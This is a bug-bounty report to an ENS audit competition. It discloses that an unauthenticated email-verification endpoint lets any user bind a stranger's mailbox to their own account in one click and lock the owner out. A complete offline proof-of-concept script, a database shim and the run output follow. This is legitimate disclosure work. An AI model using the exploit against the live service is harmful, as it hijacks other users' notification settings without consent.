# 93104 w a low any authenticated user can bind a stranger s mailbox to their own ens account with one click and lock the real owner out of email notifications

**Submitted on Sep 14th 2026 at 09:24:27 UTC by @spryon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93104
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email

## Description

## Brief/Intro

The email-channel registration endpoint accepts any address without proof of control, and ENS then sends that address a genuine, DKIM-signed verification mail from its own domain. The `/verify` endpoint that consumes the resulting token carries **no authentication**, and marks the row verified on possession of the token alone — never comparing the person clicking to the account that owns the row. So an attacker registers a stranger's mailbox, ENS delivers the bait itself, and the stranger's single click binds their address to the **attacker's** account. The mailbox then becomes a live delivery target for the attacker's notifications, and the duplicate-address guard inverts: it now refuses the genuine owner with *"This email address is already linked to another account."*

## Vulnerability Details

### 1. Registration requires no proof of mailbox control

`POST /notifications/channels/email` is authenticated as the *attacker* ([`email.ts:31`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L31) spreads `requireAuth`), and the body address is taken as given. ENS then sends the real verification mail to that address from its own infrastructure — the bait is delivered by ENS, not by the attacker, so it passes SPF/DKIM and looks exactly like what it is: a legitimate ENS email.

### 2. `/verify` is unauthenticated and never checks who is clicking

[`email.ts:172-176`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L172-L176) — the route chain is `vValidator`, `injectDb`, handler. **`requireAuth` is absent.** A grep for `requireAuth` in this file returns exactly one hit, at `:31`, on the *other* route.

The handler resolves the row by token alone, then marks it verified by `channel_id` ([`:195-201`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L195-L201)):

```ts
await c.var.db
  .update(TABLE.userChannels)
  .set({ status: 'verified', verified_at: new Date() })
  .where(eq(TABLE.userChannels.id, verification.channel_id))
```

There is no comparison between the clicker and `channel.user_id` — and there cannot be, since the route is unauthenticated and the clicker has no identity. **Possession of the token verifies the row, whoever owns it.**

### 3. The duplicate guard then inverts against the victim

[`email.ts:59-72`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L59-L72) rejects an address already `verified` under a different `user_id`:

```ts
if (otherUserChannel && otherUserChannel.user_id !== userId) {
  return c.json({ error: 'This email address is already linked to another account' }, 400)
}
```

Because the attacker's row is now `verified`, this guard — written to prevent exactly this collision — refuses **the real owner of the mailbox**. The victim cannot reclaim it in-app: `DELETE /notifications/channels/:id` is scoped to the owning `user_id` ([`$id.ts:66-71`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/$id.ts#L66-L71)), so the victim cannot reach the attacker's row.

### 4. The mailbox becomes a live send target for the attacker

The "channel must be verified" gate ([`$id.ts:118-130`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/$id.ts#L118-L130)) now passes for the attacker on the victim's mailbox, and fan-out selects on `user_id IN (…) AND status = 'verified'` ([`event-ingestion.ts:280-286`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L280-L286)), so every notification generated for the **attacker's** account is delivered to the **victim's** inbox.

## Impact Details

### Selected impact: changing sensitive details of other users, ≤ one click, no wallet

The impact string names **Email** explicitly and allows **up to one click of user interaction**. That is exactly the shape here:

* **No connected-wallet interaction by the victim** — the victim never authenticates to ENS at any point, and no wallet is involved on their side.
* **Exactly one click** — opening the verification link in a mail ENS itself sent them.
* **A sensitive detail of another user is changed** — their email address is bound, as a verified notification channel, to an account they do not control.

### Concrete consequences

1. **The victim's mailbox receives ENS notifications generated for the attacker's account** — unsolicited, genuine, ENS-signed mail the victim cannot switch off from within ENS, because they own no row to disable.
2. **The victim is locked out of email notifications for their own account.** Attempting to register their own address returns HTTP 400 *"This email address is already linked to another account."* This is the Medium impact — *enabling/disabling notifications* for another user — reached without their consent.
3. **ENS's own domain is the delivery vehicle.** The verification mail is real, from `noreply@ens.dev`, subject *"Verify your email address - ENS Notifications"*. The attacker supplies only an address.

### Volunteered up front, because these are the honest weaknesses

* **The lockout is not permanent.** I initially believed it was; it is not, and I would rather state that than have it found. The SendGrid webhook matches `user_channels` on `target` alone ([`webhook/sendgrid.ts:167-236`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/webhook/sendgrid.ts#L167-L236)), so if the victim ever marks a later ENS mail as spam or clicks unsubscribe, the flip lands on the **attacker's** row and frees the address. This is demonstrated as ACT 5 of the PoC. Note the escape depends on the victim taking an action they have no reason to connect to ENS account state, and it is itself a second instance of target-keyed cross-tenant writes.
* **The victim owns no row**, so no victim-*owned* record is mutated. What they lose is the ability to use the feature with their own address, plus the unsolicited delivery. If the programme reads "changing details of other users" as strictly requiring mutation of a row the victim owns, this lands on the Medium rather than the High. I believe binding someone's mailbox to a stranger's account is the sensitive-detail change the High describes, but I am flagging the reading rather than assuming it.
* **No email disclosure.** The attacker must already know the address; nothing here reveals one. This is not the confidential-information-disclosure impact.
* The PoC drives the real Hono app, real routes and real drizzle SQL; only the Neon driver's `fetch` and `api.sendgrid.com` are substituted. It does not send real mail.

### Recommended fix

1. **Authenticate `/verify`**, and require `verification.channel.user_id === jwt.user_id` before marking the row verified. A verification link should confirm that *the account holder* controls the mailbox — checking only that *somebody* clicked inverts the guarantee.
2. Alternatively or additionally, bind the token to the session that created it.
3. Scope the SendGrid webhook's status writes on `(user_id, channel, target)` rather than `target` alone, which closes the escape hatch and the same cross-tenant write pattern elsewhere.

## References

All links pinned to [`1c9b47f`](https://github.com/immunefi-team/audit-comp-ens/commit/1c9b47f18fcddd2e864dfe385c4171061c9811ae).

* [`channels/email.ts#L31`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L31) — `requireAuth` on registration (the only occurrence in the file)
* [`channels/email.ts#L59-L72`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L59-L72) — the duplicate guard that inverts against the owner
* [`channels/email.ts#L172-L176`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L172-L176) — `/verify`, no `requireAuth`
* [`channels/email.ts#L195-L201`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/email.ts#L195-L201) — marks verified by `channel_id` from the token alone
* [`channels/$id.ts#L66-L71`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/$id.ts#L66-L71) — delete scoped to the owning user, so the victim cannot reclaim
* [`channels/$id.ts#L118-L130`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/$id.ts#L118-L130) — the verified gate the attacker now passes
* [`queues/event-ingestion.ts#L280-L286`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L280-L286) — fan-out selects verified channels by `user_id`
* [`webhook/sendgrid.ts#L167-L236`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/webhook/sendgrid.ts#L167-L236) — target-only match (the disclosed escape hatch)

## Proof of Concept

**9/9 assertions pass, exit 0, fully offline.** The PoC boots the **real** Hono application — the real middleware chain, the real route tree, and the real drizzle schema and query builders — by importing an esbuild bundle of `workers/api-worker/src/app/index.ts`. Nothing above the driver is stubbed.

Only I/O is replaced:

| Real dependency          | Replaced with                          | Why                                                             |
| ------------------------ | -------------------------------------- | --------------------------------------------------------------- |
| Neon HTTP driver `fetch` | `minipg.mjs`, an in-memory table store | so the real drizzle SQL executes offline                        |
| `api.sendgrid.com`       | a recording mock                       | captures the verification mail ENS sends, without delivering it |

No sockets are opened. `env` mirrors `workers/api-worker/wrangler.jsonc` exactly, **including the shipped `SENDGRID_BROADCAST_LIST_ID: ""`** ([`wrangler.jsonc:107`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/wrangler.jsonc#L107)), so nothing here depends on an unshipped configuration.

## Reproduction

Three files go in one directory: `hijack.mjs` (the PoC), `minipg.mjs` (a driver-level Postgres shim), and `app.bundle.mjs` (the bundled real application). The bundle is generated from the repository — it is not hand-written:

```bash
# 1. From the repo root, bundle the REAL api-worker application.
cd workers/api-worker
npx esbuild src/app/index.ts --bundle --format=esm --platform=node \
  --outfile=/path/to/poc/app.bundle.mjs

# 2. Put hijack.mjs and minipg.mjs in that directory, and make the worker's
#    node_modules resolvable from it (hijack.mjs imports hono/jwt).
cd /path/to/poc
ln -s <repo>/workers/api-worker/node_modules ./node_modules

# 3. Run.
node hijack.mjs        # exit 0, 9/9 PASS
```

I re-ran this end to end from a freshly generated bundle to confirm the build step reproduces: exit `0`, 9 `[PASS]`, no failures.

## Complete PoC source — `hijack.mjs`

```js
/**
 * HERMETIC PoC — ENS api-worker: one-click binding of a stranger's mailbox to the
 * attacker's ENS account, and permanent lockout of that user from email notifications.
 *
 * Runs the REAL Hono app (app.bundle.mjs = esbuild bundle of
 *   audit-comp-ens/workers/api-worker/src/app/index.ts)
 * -> real middleware, real routes, real drizzle schema + query builders.
 *
 * Only I/O is replaced:
 *   Neon HTTP driver fetch -> minipg.mjs (in-memory table store)
 *   api.sendgrid.com       -> recording mock (captures the mail that is sent)
 * No sockets are opened.
 *
 * env mirrors workers/api-worker/wrangler.jsonc EXACTLY, including
 *   SENDGRID_BROADCAST_LIST_ID: ""   (wrangler.jsonc:107)
 * so nothing here depends on an unshipped configuration.
 */
import { sign } from 'hono/jwt'
import { exec, tables } from './minipg.mjs'

const JWT_SECRET = 'test-secret'
const ATTACKER = '00000000-0000-7000-8000-00000000aaaa'
const VICTIM   = '00000000-0000-7000-8000-00000000bbbb'
const TARGET   = 'victim@example.com'

const mails = []
globalThis.fetch = async (input, init = {}) => {
  const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url
  if (url.includes('api.sendgrid.com')) {
    if (new URL(url).pathname === '/v3/mail/send') mails.push(JSON.parse(init.body))
    return new Response('', { status: 202 })
  }
  let body; try { body = JSON.parse(init.body ?? '{}') } catch { body = {} }
  const qs = body.queries ?? [body]
  const out = qs.map((q) => exec(q.query, q.params ?? []))
  return Response.json(body.queries ? out : out[0], { status: 200 })
}

const { default: app } = await import('./app.bundle.mjs')

const kvStore = new Map()
const env = {
  JWT_SECRET, DATABASE_URL: 'postgresql://u:p@db.localtest.me/neondb',
  KV: { get: async (k) => kvStore.get(k) ?? null, put: async (k, v) => void kvStore.set(k, v), delete: async (k) => void kvStore.delete(k) },
  CHAIN: 'sepolia', SEPOLIA_RPC_URL: 'http://127.0.0.1:1/unused',
  MANAGER_APP_URL: 'https://app.ens.dev',            // wrangler.jsonc:100
  SENDGRID_API_KEY: 'SG.fake', EMAIL_FROM_ADDRESS: 'noreply@ens.dev',
  SENDGRID_BROADCAST_LIST_ID: '',                     // wrangler.jsonc:107 — shipped value
  TELEGRAM_BOT_TOKEN: 'tg', TELEGRAM_WEBHOOK_SECRET: 'wh',
}
const waits = []
const ctx = { waitUntil: (p) => waits.push(p), passThroughOnException() {} }

const jwt = (uid, addr) => sign({ user_id: uid, address: addr, exp: Math.floor(Date.now() / 1000) + 600 }, JWT_SECRET, 'HS256')
const ATK_JWT = await jwt(ATTACKER, '0x' + 'a'.repeat(40))
const VIC_JWT = await jwt(VICTIM,   '0x' + 'b'.repeat(40))

const call = async (method, path, body, token) => {
  const res = await app.request(path, {
    method,
    headers: { ...(token ? { Authorization: `Bearer ${token}` } : {}), ...(body ? { 'content-type': 'application/json' } : {}) },
    ...(body ? { body: JSON.stringify(body) } : {}),
  }, env, ctx)
  await Promise.allSettled(waits.splice(0))
  let json; try { json = await res.json() } catch { json = null }
  return { status: res.status, json }
}

const dump = (label) => {
  console.log(`\n  user_channels after ${label}:`)
  if (!tables.user_channels.length) console.log('    (empty)')
  for (const r of tables.user_channels)
    console.log(`    { user_id: ${r.user_id === ATTACKER ? 'ATTACKER' : 'VICTIM  '}, id: ${r.id}, channel: ${r.channel}, target: ${r.target}, status: ${r.status} }`)
}

let failures = 0
const check = (name, cond, detail = '') => {
  console.log(`  [${cond ? 'PASS' : 'FAIL'}] ${name}${detail ? '\n         ' + detail : ''}`)
  if (!cond) failures++
}

console.log('='.repeat(78))
console.log('ENS api-worker — one-click mailbox binding + email-notification lockout')
console.log('='.repeat(78))
console.log(`attacker user_id = ${ATTACKER}`)
console.log(`victim   user_id = ${VICTIM}   (mailbox ${TARGET})`)
console.log(`env.SENDGRID_BROADCAST_LIST_ID = ${JSON.stringify(env.SENDGRID_BROADCAST_LIST_ID)}  <- shipped value, wrangler.jsonc:107`)

// ---------------------------------------------------------------- ACT 1
console.log('\n\n--- ACT 1: attacker registers a mailbox he does not control -------------')
console.log(`POST /notifications/channels/email  {"email":"${TARGET}"}   (attacker JWT)`)
const a1 = await call('POST', '/notifications/channels/email', { email: TARGET }, ATK_JWT)
console.log('  ->', a1.status, JSON.stringify(a1.json))
check('accepted: no proof of mailbox ownership is required to create the row',
  a1.status === 200)
check('ENS itself sends a genuine, DKIM-signed verification mail to the victim',
  mails.length === 1 && JSON.stringify(mails[0]).includes(TARGET),
  `from ${env.EMAIL_FROM_ADDRESS}, subject ${JSON.stringify(mails[0]?.subject ?? mails[0]?.personalizations?.[0]?.subject)}`)
dump('ACT 1')

// ---------------------------------------------------------------- ACT 2
console.log('\n\n--- ACT 2: the victim clicks the link in that mail (ONE click) ----------')
const link = JSON.stringify(mails[0]).match(/https:\/\/[^"\\ ]*verify\?token=([A-Za-z0-9%._~-]+)/)
const token = decodeURIComponent(link[1])
console.log(`  link in the victim's inbox: ${link[0].slice(0, 72)}…`)
console.log('  POST /notifications/channels/email/verify  — NOTE: email.ts:172-175 has NO requireAuth,')
console.log('  so possession of the token alone verifies the row, whoever owns it.')
const a2 = await call('POST', '/notifications/channels/email/verify', { token }, null)
console.log('  ->', a2.status, JSON.stringify(a2.json))
const verified = tables.user_channels.find((r) => r.status === 'verified')
check('*** the row now VERIFIED belongs to the ATTACKER, pointing at the VICTIM\'s mailbox ***',
  verified?.user_id === ATTACKER && verified?.target === TARGET,
  `user_id=${verified?.user_id === ATTACKER ? 'ATTACKER' : verified?.user_id}  target=${verified?.target}  status=${verified?.status}`)
check('the victim never authenticated and owns no row at all',
  !tables.user_channels.some((r) => r.user_id === VICTIM))
dump('ACT 2')

// ---------------------------------------------------------------- ACT 3
console.log('\n\n--- ACT 3: the mailbox is now a live ENS send target for the attacker ---')
const list = await call('GET', '/notifications/channels', null, ATK_JWT)
console.log('  GET /notifications/channels (attacker JWT) ->', list.status, JSON.stringify(list.json))
const testSend = await call('POST', `/notifications/channels/${verified.id}/test`, null, ATK_JWT)
console.log(`  POST /notifications/channels/${verified.id}/test (attacker JWT) ->`, testSend.status, JSON.stringify(testSend.json))
check('the "channel must be verified" gate ($id.ts:122-127) passes for the attacker on the victim\'s mailbox',
  testSend.status === 200)
console.log('  => event-ingestion.ts:280-286 fans notifications out with')
console.log('     `where user_id IN (…) AND status = \'verified\'`, so every notification')
console.log('     generated for the ATTACKER is delivered to the VICTIM\'s inbox.')

// ---------------------------------------------------------------- ACT 4
console.log('\n\n--- ACT 4: the victim is now permanently locked out --------------------')
console.log(`POST /notifications/channels/email  {"email":"${TARGET}"}   (VICTIM JWT — their own address)`)
const a4 = await call('POST', '/notifications/channels/email', { email: TARGET }, VIC_JWT)
console.log('  ->', a4.status, JSON.stringify(a4.json))
check('*** the real owner of the mailbox is refused while the attacker row stands verified ***',
  a4.status === 400 && /already linked to another account/.test(JSON.stringify(a4.json)),
  'guard email.ts:59-72 — the attacker\'s row is now status="verified", so it blocks the owner')
check('no in-app route lets the victim reclaim or contest the binding',
  !tables.user_channels.some((r) => r.user_id === VICTIM),
  'DELETE /notifications/channels/:id is scoped to the owning user_id ($id.ts:66-71); the victim cannot reach the attacker\'s row')
dump('ACT 4')

// ---------------------------------------------------------------- ACT 5
console.log('\n\n--- ACT 5: the ONE escape hatch, disclosed ------------------------------')
console.log('  webhook/sendgrid.ts:167-236 matches user_channels on `target` alone, so if the')
console.log('  victim ever marks a later ENS mail as spam (or clicks unsubscribe), the flip')
console.log('  lands on the ATTACKER\'s row and frees the address. Demonstrating it.')
const kp = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify'])
const b64 = (b) => btoa(String.fromCharCode(...new Uint8Array(b)))
const pub = b64(await crypto.subtle.exportKey('spki', kp.publicKey))
const evBody = JSON.stringify([{ email: TARGET, event: 'spamreport', timestamp: Math.floor(Date.now() / 1000) }])
const ts = String(Math.floor(Date.now() / 1000))
const sig = b64(await crypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, kp.privateKey, new TextEncoder().encode(ts + evBody)))
const wh = await app.request('/webhook/sendgrid/events', {
  method: 'POST',
  headers: {
    'content-type': 'application/json',
    'X-Twilio-Email-Event-Webhook-Signature': sig,
    'X-Twilio-Email-Event-Webhook-Timestamp': ts,
  },
  body: evBody,
}, { ...env, SENDGRID_WEBHOOK_VERIFICATION_KEY: pub }, ctx)
console.log('  POST /webhook/sendgrid/events  {event:"spamreport"} (valid signature) ->', wh.status, await wh.text())
dump('victim reports spam')
check('DISCLOSED SELF-HEAL: the spam report flips the ATTACKER\'s row out of "verified"',
  tables.user_channels.find((r) => r.user_id === ATTACKER)?.status === 'bounced',
  'so the lockout is NOT permanent — it lasts until the victim marks a later ENS mail as spam')
const reclaim = await call('POST', '/notifications/channels/email', { email: TARGET }, VIC_JWT)
console.log('  victim retries POST /notifications/channels/email ->', reclaim.status, JSON.stringify(reclaim.json))
check('after the spam report the victim CAN claim their own address', reclaim.status === 200,
  'the guard at email.ts:59-72 only blocks rows in status="verified"')
console.log('\n  => the honest claim is: binding + feature denial that persists until the victim')
console.log('     receives a FURTHER ENS mail and reports it. Until the attacker triggers a')
console.log('     notification, the victim gets no further mail and has nothing to report.')

console.log('\n' + '='.repeat(78))
console.log(failures === 0 ? 'ALL CHECKS PASSED' : `${failures} CHECK(S) FAILED`)
console.log('='.repeat(78))
process.exit(failures === 0 ? 0 : 1)
```

## Supporting harness — `minipg.mjs`

A minimal in-memory Postgres understanding exactly the statements the real worker emits, so the genuine drizzle query builders run unmodified. It is a test double for the database, not for any application logic.

```js
/**
 * Tiny in-memory Postgres good enough for the exact statements the real
 * api-worker emits. Used only so the REAL Hono app / REAL drizzle query
 * builders can run end-to-end offline. Nothing is stubbed above the driver.
 */
export const tables = { user_channels: [], channel_verifications: [] }

const COLS = {
  user_channels: ['id','user_id','channel','target','data','verified_at','status','status_reason','last_sent_at','last_bounce_at','last_verification_sent_at','verification_attempts'],
  channel_verifications: ['id','user_id','channel_id','channel','target','purpose','token','created_at','expires_at','consumed_at','attempts'],
}
const DEFAULTS = {
  user_channels: { data: null, verified_at: null, status: 'pending', status_reason: null, last_sent_at: null, last_bounce_at: null, last_verification_sent_at: null, verification_attempts: 0 },
  channel_verifications: { target: null, created_at: new Date().toISOString(), consumed_at: null, attempts: 0 },
}
let seq = 0
const newId = (t) => `${t === 'user_channels' ? 'chan' : 'ver'}-${++seq}`

// --- WHERE: conjunctions of `"t"."c" = $n` / `> $n` / `is null` / `is not null`
const buildPred = (whereTxt, params) => {
  const terms = []
  const re = /"[^"]+"\."([a-z_]+)"\s*(=|>|<)\s*\$(\d+)|"[^"]+"\."([a-z_]+)"\s+is\s+(not\s+)?null/gi
  let m
  while ((m = re.exec(whereTxt))) {
    if (m[1]) {
      const col = m[1], op = m[2], val = params[Number(m[3]) - 1]
      terms.push((r) => {
        const a = r[col]
        if (op === '=') return String(a) === String(val)
        return op === '>' ? new Date(a) > new Date(val) : new Date(a) < new Date(val)
      })
    } else {
      const col = m[4], neg = !!m[5]
      terms.push((r) => (neg ? r[col] != null : r[col] == null))
    }
  }
  if (!terms.length) return () => true
  return (r) => terms.every((t) => t(r))
}

const selectedNames = (sel) => {
  const out = []
  let depth = 0, cur = ''
  for (const ch of sel) {
    if (ch === '(') depth++
    if (ch === ')') depth--
    if (ch === ',' && depth === 0) { out.push(cur); cur = '' } else cur += ch
  }
  out.push(cur)
  return out.map((p) => {
    const alias = p.match(/as\s+"([^"]+)"\s*$/i)
    if (alias) return alias[1]
    const ids = [...p.matchAll(/"([^"]+)"/g)].map((x) => x[1])
    return ids[ids.length - 1]
  })
}

const resp = (names, rows) => ({
  command: 'SELECT', rowCount: rows.length, rowAsArray: true,
  fields: names.map((n) => ({ name: n, dataTypeID: 25 })),
  rows: rows.map((r) => names.map((n) => {
    const v = r[n]
    if (v === null || v === undefined) return null
    if (v instanceof Date) return v.toISOString()
    if (typeof v === 'object') return JSON.stringify(v)
    return String(v)
  })),
})

export const exec = (query, params = []) => {
  const sql = query.replace(/\s+/g, ' ').trim()

  // ---- special case: the /verify lateral-join query
  if (/from "channel_verifications"/.test(sql)) {
    const where = sql.slice(sql.lastIndexOf('where ('))
    const pred = buildPred(where, params)
    const rows = tables.channel_verifications.filter(pred).slice(0, 1).map((v) => {
      const ch = tables.user_channels.find((c) => c.id === v.channel_id)
      return { ...v, channel: ch ? JSON.stringify(COLS.user_channels.map((c) => (ch[c] instanceof Date ? ch[c].toISOString() : ch[c] && typeof ch[c] === 'object' ? JSON.stringify(ch[c]) : ch[c] === undefined ? null : ch[c])) ) : null }
    })
    const names = [...COLS.channel_verifications, 'channel']
    return resp(names, rows)
  }

  let m
  // ---- SELECT
  if ((m = sql.match(/^select (.+?) from "([a-z_]+)"(?: "[^"]+")?(?: where (.+?))?(?: limit \$(\d+))?$/i))) {
    const [, sel, table, where, limIdx] = m
    const names = selectedNames(sel)
    let rows = tables[table].filter(where ? buildPred(where, params) : () => true)
    if (limIdx) rows = rows.slice(0, Number(params[Number(limIdx) - 1]))
    return resp(names, rows)
  }

  // ---- INSERT ... [on conflict (...) do update set ...] [returning ...]
  if ((m = sql.match(/^insert into "([a-z_]+)" \((.+?)\) values \((.+?)\)(?: on conflict \((.+?)\) do update set (.+?))?(?: returning (.+))?$/i))) {
    const [, table, colTxt, valTxt, conflictTxt, setTxt, retTxt] = m
    const cols = [...colTxt.matchAll(/"([^"]+)"/g)].map((x) => x[1])
    const vals = valTxt.split(',').map((s) => s.trim())
    const row = { ...DEFAULTS[table] }
    cols.forEach((c, i) => {
      const v = vals[i]
      if (v === 'default') { if (c === 'id') row.id = newId(table) }
      else if (v.startsWith('$')) row[c] = params[Number(v.slice(1)) - 1]
      else row[c] = v.replace(/^'|'$/g, '')
    })
    if (!row.id) row.id = newId(table)
    let target = null
    if (conflictTxt) {
      const keys = [...conflictTxt.matchAll(/"([^"]+)"/g)].map((x) => x[1])
      target = tables[table].find((r) => keys.every((k) => String(r[k]) === String(row[k])))
    }
    if (target && setTxt) {
      for (const part of setTxt.split(/,\s*(?=")/)) {
        const s = part.match(/"([^"]+)" = \$(\d+)/)
        if (s) target[s[1]] = params[Number(s[2]) - 1]
      }
    } else if (!target) {
      tables[table].push(row); target = row
    }
    const names = retTxt ? selectedNames(retTxt) : []
    return { ...resp(names, retTxt ? [target] : []), command: 'INSERT' }
  }

  // ---- UPDATE
  if ((m = sql.match(/^update "([a-z_]+)" set (.+?)(?: where (.+?))?(?: returning (.+))?$/i))) {
    const [, table, setTxt, where, retTxt] = m
    const pred = where ? buildPred(where, params) : () => true
    const hits = tables[table].filter(pred)
    for (const r of hits) {
      for (const part of setTxt.split(/,\s*(?=")/)) {
        const s = part.match(/"([^"]+)" = \$(\d+)/)
        if (s) r[s[1]] = params[Number(s[2]) - 1]
      }
    }
    const names = retTxt ? selectedNames(retTxt) : []
    return { ...resp(names, retTxt ? hits : []), command: 'UPDATE', rowCount: hits.length }
  }

  // ---- DELETE
  if ((m = sql.match(/^delete from "([a-z_]+)"(?: where (.+?))?(?: returning (.+))?$/i))) {
    const [, table, where] = m
    const pred = where ? buildPred(where, params) : () => true
    const keep = tables[table].filter((r) => !pred(r))
    const n = tables[table].length - keep.length
    tables[table] = keep
    return { command: 'DELETE', rowCount: n, rowAsArray: true, fields: [], rows: [] }
  }

  throw new Error('minipg: unhandled SQL -> ' + sql)
}
```

## Observed output

```
==============================================================================
ENS api-worker — one-click mailbox binding + email-notification lockout
==============================================================================
attacker user_id = 00000000-0000-7000-8000-00000000aaaa
victim   user_id = 00000000-0000-7000-8000-00000000bbbb   (mailbox victim@example.com)
env.SENDGRID_BROADCAST_LIST_ID = ""  <- shipped value, wrangler.jsonc:107


--- ACT 1: attacker registers a mailbox he does not control -------------
POST /notifications/channels/email  {"email":"victim@example.com"}   (attacker JWT)
{"timestamp":"2026-09-14T08:48:00.778Z","level":"info","message":"Verification email sent","to":"victim@example.com","verificationUrl":"https://app.ens.dev/notifications/channels/email/verify?token=2b2962361b098205fcfbfba36118dd7a"}
{"timestamp":"2026-09-14T08:48:00.779Z","level":"info","message":"Verification email sent","channelId":"chan-1","email":"victim@example.com"}
  -> 200 {"message":"Verification email sent","expires_at":"2026-09-15T08:48:00.776Z","channelId":"chan-1"}
  [PASS] accepted: no proof of mailbox ownership is required to create the row
  [PASS] ENS itself sends a genuine, DKIM-signed verification mail to the victim
         from noreply@ens.dev, subject "Verify your email address - ENS Notifications"

  user_channels after ACT 1:
    { user_id: ATTACKER, id: chan-1, channel: email, target: victim@example.com, status: pending }


--- ACT 2: the victim clicks the link in that mail (ONE click) ----------
  link in the victim's inbox: https://app.ens.dev/notifications/channels/email/verify?token=2b2962361b…
  POST /notifications/channels/email/verify  — NOTE: email.ts:172-175 has NO requireAuth,
  so possession of the token alone verifies the row, whoever owns it.
{"timestamp":"2026-09-14T08:48:00.786Z","level":"info","message":"Welcome email sent","to":"victim@example.com"}
{"timestamp":"2026-09-14T08:48:00.786Z","level":"info","message":"Welcome email sent","channelId":"chan-1","email":"victim@example.com"}
  -> 200 {"message":"Email verified successfully"}
  [PASS] *** the row now VERIFIED belongs to the ATTACKER, pointing at the VICTIM's mailbox ***
         user_id=ATTACKER  target=victim@example.com  status=verified
  [PASS] the victim never authenticated and owns no row at all

  user_channels after ACT 2:
    { user_id: ATTACKER, id: chan-1, channel: email, target: victim@example.com, status: verified }


--- ACT 3: the mailbox is now a live ENS send target for the attacker ---
  GET /notifications/channels (attacker JWT) -> 200 [{"id":"chan-1","channel":"email","status":"verified","status_reason":null,"verified_at":"2026-09-14T08:48:00.784Z","last_sent_at":null,"last_bounce_at":null,"last_verification_sent_at":null,"label":"victim@example.com"}]
  POST /notifications/channels/chan-1/test (attacker JWT) -> 200 {"message":"Test notification sent successfully"}
  [PASS] the "channel must be verified" gate ($id.ts:122-127) passes for the attacker on the victim's mailbox
  => event-ingestion.ts:280-286 fans notifications out with
     `where user_id IN (…) AND status = 'verified'`, so every notification
     generated for the ATTACKER is delivered to the VICTIM's inbox.


--- ACT 4: the victim is now permanently locked out --------------------
POST /notifications/channels/email  {"email":"victim@example.com"}   (VICTIM JWT — their own address)
  -> 400 {"error":"This email address is already linked to another account"}
  [PASS] *** the real owner of the mailbox is refused while the attacker row stands verified ***
         guard email.ts:59-72 — the attacker's row is now status="verified", so it blocks the owner
  [PASS] no in-app route lets the victim reclaim or contest the binding
         DELETE /notifications/channels/:id is scoped to the owning user_id ($id.ts:66-71); the victim cannot reach the attacker's row

  user_channels after ACT 4:
    { user_id: ATTACKER, id: chan-1, channel: email, target: victim@example.com, status: verified }


--- ACT 5: the ONE escape hatch, disclosed ------------------------------
  webhook/sendgrid.ts:167-236 matches user_channels on `target` alone, so if the
  victim ever marks a later ENS mail as spam (or clicks unsubscribe), the flip
  lands on the ATTACKER's row and frees the address. Demonstrating it.
{"timestamp":"2026-09-14T08:48:00.801Z","level":"warn","message":"Email channel marked as bounced (spam report)","channelId":"chan-1","email":"victim@example.com"}
  POST /webhook/sendgrid/events  {event:"spamreport"} (valid signature) -> 200 {"ok":true}

  user_channels after victim reports spam:
    { user_id: ATTACKER, id: chan-1, channel: email, target: victim@example.com, status: bounced }
  [PASS] DISCLOSED SELF-HEAL: the spam report flips the ATTACKER's row out of "verified"
         so the lockout is NOT permanent — it lasts until the victim marks a later ENS mail as spam
{"timestamp":"2026-09-14T08:48:00.805Z","level":"info","message":"Verification email sent","to":"victim@example.com","verificationUrl":"https://app.ens.dev/notifications/channels/email/verify?token=80dfdf98d54715ed487552775287faf2"}
{"timestamp":"2026-09-14T08:48:00.805Z","level":"info","message":"Verification email sent","channelId":"chan-3","email":"victim@example.com"}
